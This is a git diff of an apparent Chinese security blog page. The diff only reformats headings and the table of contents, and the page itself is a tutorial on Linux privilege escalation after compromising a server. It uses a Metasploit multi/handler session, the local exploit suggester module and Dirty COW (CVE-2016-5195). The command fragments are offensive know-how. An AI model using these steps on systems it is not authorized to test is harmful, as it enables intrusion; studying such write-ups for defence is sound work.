@@ -77,13 +77,20 @@
                     <span>目录</span>
                     <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
                 </div>
-                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents"></nav></div>
-            </div><div class="content" id="content"><h1 id="前言">前言</h1>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#前言">前言</a></li>
+    <li><a href="#设置session">设置session</a></li>
+    <li><a href="#suggester查找有用exp">suggester查找有用EXP</a></li>
+    <li><a href="#赃牛提权cve-2016-5195">赃牛提权CVE-2016-5195</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h2 id="前言">前言</h2>
 <p>链接：https://aftermorr0w.github.io/posts/pdf%E5%86%99%E5%85%A5javascript%E9%80%A0%E6%88%90xss/</p>
 <p>我们废了半天劲拿下了他的服务器，现在回过头来对其linux服务器进行提权</p>
 <p>还是使用我们万能的msf
 这里介绍的是suggester模块，该模块可以教我们如何快速的查找目标可用的提权EXP</p>
-<h1 id="设置session">设置session</h1>
+<h2 id="设置session">设置session</h2>
 <p>我们先连上我们的msf 设置一个session
 vps操作</p>
 <pre tabindex="0"><code>use exploit/multi/handler
@@ -100,7 +107,7 @@ run
         data-sizes="auto"
         alt="/images/1663050921114.png"
         title="enter description here" /></p>
-<h1 id="suggester查找有用exp">suggester查找有用EXP</h1>
+<h2 id="suggester查找有用exp">suggester查找有用EXP</h2>
 <pre tabindex="0"><code>background
 search suggester
 use 0
@@ -132,7 +139,7 @@ run
         alt="/images/1663050836910.png"
         title="enter description here" /></p>
 <p>真TM牛逼，还以为是个好的文章素材呢，这就翻车了</p>
-<h1 id="赃牛提权cve-2016-5195">赃牛提权CVE-2016-5195</h1>
+<h2 id="赃牛提权cve-2016-5195">赃牛提权CVE-2016-5195</h2>
 <p>Linux kernel &gt;= 2.6.22（2007年发行，到2016年10月18日才修复）</p>
 <p>uname -a 
 查看linus内核
